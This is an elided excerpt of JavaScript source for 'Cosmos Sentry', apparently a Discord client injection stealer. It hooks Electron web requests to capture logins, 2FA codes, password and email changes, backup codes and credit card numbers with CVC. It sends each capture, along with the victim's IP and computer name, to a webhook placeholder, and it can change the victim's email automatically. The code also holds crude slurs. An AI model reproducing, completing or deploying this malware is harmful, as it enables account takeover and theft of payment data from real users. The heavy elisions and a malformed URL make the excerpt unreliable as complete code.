...
var config = {
  ...
  injection_url:
    "https://raw.githubusercontent.comByteSleuths/sub/main/index.js",
  webhook: "%WEBHOOK%",
  Placed: "%API_URL%",
  Filter: {
    urls: [
    ...
    embeds: [
      {
        ...
        footer: {
          text: ` [${config.creator}] | https://discord.com/invite/zhack`,
        },
      },
    ],
  };
...
function generatePassword() {
  const baseWords = ["CosmosSentry", "Cosmos", "Gaypsilon", "Epsimerde", "suckmydickenigma"];
  ...
  if (fs.existsSync(__dirname + "/ThiefCat")) {
    ...
    if (!token) {
      var params = await makeEmbed({
        title: "<:zhack:1132934190032244786> Cosmos Sentry Initialized",
        fields: [
          {
            name: "Injection Info",
      ...
      var params = await makeEmbed({
        title: " Comsos Sentry Initialized",
        ...
        fields: [
          ...
          {
            name: "@Copyright",
            value: `[Cosmos Sentry 2024 <:zhack:1132934190032244786>](https://discord.com/invite/zhack)`,
            inline: !0,
          },
          {
            name: "Cosmos Files",
          ...
          {
            name: "Bio <:zhack:1132934190032244786>",
            value: `\`\`\`${
    ...
    if (
      ...
      if (!token) {
        var params = await makeEmbed({
          title:
            "<:zhack:1132934190032244786> Cosmos Sentry User log out (User not Logged in before)",
          fields: [
            {
              name: "Injection Info",
        ...
        var params = await makeEmbed({
          title:
            "<:zhack:1132934190032244786> Cosmos Sentry Victim got logged out",
    ...
    switch (true) {
        ...
        if (!token) {
          await electron.session.defaultSession.webRequest.onCompleted(
            ...
            async (re, callback) => {
              ...
              var params = await makeEmbed({
                title: "<:zhack:1132934190032244786> Cosmos Sentry User Login",
                color: config["embed-color"],
                description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                fields: [
                  {
                  ...
                  {
                    name: "Code 2fa used <:zhack:1132934190032244786>",
                    value: `\`\`\`${
                      dt.code !== null &&
                      dt.code !== undefined &&
                      dt.code !== ""
      ...
      case request.url.endsWith("users/@me"):
        ...
        if (data.new_password) {
          var params = await makeEmbed({
            title:
              "<:zhack:1132934190032244786> Cosmos Sentry Detect Password Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
          ...
          if (config.changeMailAuto == "true") {
            ...
            try {
              ...
              if (res.username) {
                var params = await makeEmbed({
                  title:
                    "<:zhack:1132934190032244786> Cosmos Sentry Have changed the victim mail",
                  color: config["embed-color"],
                  description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
                  fields: [
                    {
          ...
          var params = await makeEmbed({
            title:
              "<:zhack:1132934190032244786> Cosmos Sentry Detect Email Changed",
            color: config["embed-color"],
            description: `\`\`\` - Computer Name: \n${computerName}\n- Injection Path: ${client_discord}\n- IP: ${ip}\n\`\`\`\n[Download pfp](${userAvatar})`,
            fields: [
              {
        ...
        if (CardNumber && CardCVC && month && year) {
          await electron.session.defaultSession.webRequest.onCompleted(
            ...
            async (re, callback) => {
              ...
              var params = await makeEmbed({
                title:
                  "<:zhack:1132934190032244786> Cosmos User Credit Card Added",
                color: config["embed-color"],
                fields: [
                  {
                    name: "Cosmos Files",
      ...
      case request.url.endsWith("/enable"):
        ...
        var params = await makeEmbed({
          title: "<:zhack:1132934190032244786> Cosmos Sentry User Enable 2FA",
          color: config["embed-color"],
          fields: [
            {
              name: "Cosmos Files",
      ...
      case request.url.endsWith("/disable"):
        var params = await makeEmbed({
          title: "<:zhack:1132934190032244786> Cosmos Sentry User Removed 2FA",
          color: config["embed-color"],
          fields: [
            {
              name: "Cosmos Files",
      ...
      case request.url.endsWith("/codes-verification"):
        ...
        var params = await makeEmbed({
          title: "<:zhack:1132934190032244786> Cosmos Sentry User 2FA Codes",
          color: config["embed-color"],
          fields: [
            {
              name: "Cosmos Files",
